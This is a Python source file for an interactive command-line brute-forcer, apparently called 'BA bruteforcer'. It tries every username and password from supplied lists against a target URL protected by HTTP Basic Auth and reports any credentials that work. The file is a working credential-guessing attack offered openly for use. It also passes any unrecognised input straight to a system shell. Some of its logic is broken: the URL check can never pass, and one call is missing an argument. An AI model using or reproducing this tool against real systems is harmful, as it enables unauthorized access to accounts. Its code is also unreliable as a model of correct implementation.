import atexit
import readline
import subprocess
import requests
from requests.auth import HTTPBasicAuth
import cmd
import sys
from termcolor import colored
import os

class Mycmd(cmd.Cmd):
    prompt = colored(">>>>", "green")
    
    def banner(self):
        print(colored('''
-                                                                                                              _____        _____                                                            _____                    
______  ______      _____        ______  ______  ___________    ______   _____   ________    ________     _____\    \ ____  \    \         ____     ___________              _____      _____\    \ ___________       
\     \|\     \   /      |_      \     \|\     \ \          \   \     \  \    \ /        \  /        \   /    / |    |\   \ /____/|    ____\_  \__  \          \        _____\    \_   /    / |    |\          \      
 |     |\|     | /         \      |     |\|     | \    /\    \   \    |  |    ||\         \/         /| /    /  /___/| |  |/_____|/   /     /     \  \    /\    \      /     /|     | /    /  /___/| \    /\    \     
 |     |/____ / |     /\    \     |     |/____ /   |   \_\    |   |   |  |    || \            /\____/ ||    |__ |___|/ |  |    ___   /     /\      |  |   \_\    |    /     / /____/||    |__ |___|/  |   \_\    |    
 |     |\     \ |    |  |    \    |     |\     \   |      ___/    |    \_/   /||  \______/\   \     | ||       \       |   \__/   \ |     |  |     |  |      ___/    |     | |____|/ |       \        |      ___/     
 |     | |     ||     \/      \   |     | |     |  |      \  ____ |\         \| \ |      | \   \____|/ |     __/ __   /      /\___/||     |  |     |  |      \  ____ |     |  _____  |     __/ __     |      \  ____  
 |     | |     ||\      /\     \  |     | |     | /     /\ \/    \| \         \__\|______|  \   \      |\    \  /  \ /      /| | | ||     | /     /| /     /\ \/    \|\     \|\    \ |\    \  /  \   /     /\ \/    \ 
/_____/|/_____/|| \_____\ \_____\/_____/|/_____/|/_____/ |\______| \ \_____/\    \        \  \___\     | \____\/    ||_____| /\|_|/ |\     \_____/ |/_____/ |\______|| \_____\|    | | \____\/    | /_____/ |\______| 
|    |||     | || |     | |     ||    |||     | ||     | | |     |  \ |    |/___/|         \ |   |     | |    |____/||     |/       | \_____\   | / |     | | |     || |     /____/| | |    |____/| |     | | |     | 
|____|/|_____|/  \|_____|\|_____||____|/|_____|/ |_____|/ \|_____|   \|____|   | |          \|___|      \|____|   | ||_____|         \ |    |___|/  |_____|/ \|_____| \|_____|    ||  \|____|   | | |_____|/ \|_____| 
                                                                           |___|/                             |___|/                  \|____|                                |____|/        |___|/                    
-----------------------------------------------------------------------------------------------------------------c̶o̶d̶e̶d̶ b̶y̶ w̶h̶i̶t̶e̶d̶e̶v̶i̶l̶------------------------------------------------------------------------------------
''',"cyan"))

    def __init__(self):
        super().__init__()        
        self.targetUrl = ""
        self.userNameList = []
        self.passWordList = []
        self.filename = ""

    def help_run(self, line):
        print("run - Run the brute-force attack")
        print("    Usage: run")
        print("    Description: Runs the brute-force attack using the provided target URL, username list, and password list.")

    def help_clear_history(self):
        print("clear_history - Clear the command history")
        print("    Usage: clear_history")
        print("    Description: Clears the history of commands entered in the past.")

    def help_history(self):
        print("history - Display the command history")
        print("    Usage: history")
        print("    Description: Shows a list of previously entered commands with line numbers.")

    def help_setpass(self):
        print("setpass - Set the password list")
        print("    Usage: setpass <filename>")
        print("           setpass <password1> <password2> ...")
        print("    Description: Sets the list of passwords from a file or directly from command-line arguments.")

    def help_setuname(self):
        print("setuname - Set the username list")
        print("    Usage: setuname <filename>")
        print("           setuname <username1> <username2> ...")
        print("    Description: Sets the list of usernames from a file or directly from command-line arguments.")

    def help_seturl(self):
        print("seturl - Set the target URL")
        print("    Usage: seturl <URL>")
        print("    Description: Sets the target URL for the brute-force attack.")


    def emptyline(self):
        pass


    def save_history(self):
        history_file = os.path.expanduser(".mycmd_history")
        with open(history_file, 'w') as f:
            history_entries = [readline.get_history_item(i) for i in range(1, readline.get_current_history_length() + 1)]
            f.write('\n'.join(history_entries))

    def preloop(self):
        history_file = os.path.expanduser(".mycmd_history")
        if not os.path.exists(history_file):  # Check if history file exists
            open(history_file, 'a').close()   # Create an empty file if it doesn't exist
        readline.read_history_file(history_file)
        readline.set_history_length(1000)

    def postloop(self):
        atexit.register(self.save_history)
   
    def do_history(self, args):
        self.save_history()
        with open(".mycmd_history", 'r') as f:
            max_line_number_width = len(str(sum(1 for _ in f)))

        with open(".mycmd_history", 'r') as f:
            for line_number, line in enumerate(f, start=1):
                formatted_line_number = f"{line_number: <{max_line_number_width}}"
                print(f"{formatted_line_number} {line.rstrip()}")

    def do_clear_history(self, args):
        with open(".mycmd_history", 'w'):
            pass
        print("Command history cleared.")

    def do_run(self, args):
        if not self.targetUrl or not self.userNameList or not self.passWordList:
            print(colored("[!] Error: Target URL, username list, and password list must be set before running the brute-force attack.", "red"))
            return

        for username in self.userNameList:
            for password in self.passWordList:
                try:
                    response = requests.get(self.targetUrl, auth=HTTPBasicAuth(username, password))
                    if response.status_code == 200:
                        print(colored(f"[+] Authentication successful! Username: {username}, Password: {password}", "green"))
                        return
                    else:
                        print(colored(f"[-] Trying:- Username: {username}, Password: {password}", "red"))
                except requests.exceptions.RequestException:
                    pass

        print(colored("[!] Bruteforce failed. No valid credentials found.", "red"))

    def do_setuname(self, line):
        filename = line.strip()
        if os.path.exists(filename):
            self.filename = filename
            with open(filename, "r") as f:
                print(colored(f"[+] Reading file: {filename}", "green"))
                lines = [line.rstrip('\n') for line in f]
                self.userNameList.extend(lines)
        else:
            self.userNameList.clear()
            self.userNameList.append(line)
        print(self.userNameList)

    def do_seturl(self, line):
        URL = line.strip()
        try:
            res = requests.get(URL).status_code
            if res == 200  and res == 401:
                self.targetUrl = URL
            else:
                raise ValueError("Invalid Url or server down.")
        except Exception as e:
            print(colored(f"[!] Error: {e}", "red"))

    def do_setpass(self, line):
        filename = line.strip()
        if os.path.exists(filename):
            self.filename = filename
            with open(filename, "r") as f:
                print(colored(f"[+] Reading file: {filename}", "green"))
                lines = [line.rstrip('\n') for line in f]
                self.passWordList.extend(lines)
        else:
            print(colored("[!] Error: File doesn't exist", "red"))

    def default(self, line):
        try:
            subprocess.run(line, shell=True, check=True)
            if line == "clear":
                self.banner()
            elif line == "exit":
                self.exit()
                sys.exit(1)

            if line == "scan":
                self.do_run()
        except FileNotFoundError:
            print(colored(f"Command not found: {line}", "red"))
        except KeyboardInterrupt:
            print(colored("\n[!] Execution interrupted by the user", "red"))
        except Exception as e:
            print(colored(f"Error: {str(e)}", "red"))

    def exit(self):
        print(colored("Thank you for Using BA bruteforcer. \nDo support https://github.com/whitedevil1710","red"))

if __name__ == '__main__':
    try:
        Mycmd().banner()
        Mycmd().cmdloop()
    except KeyboardInterrupt:
        print(colored("\n[!] User Interrupted", "red"))
        sys.exit(1)
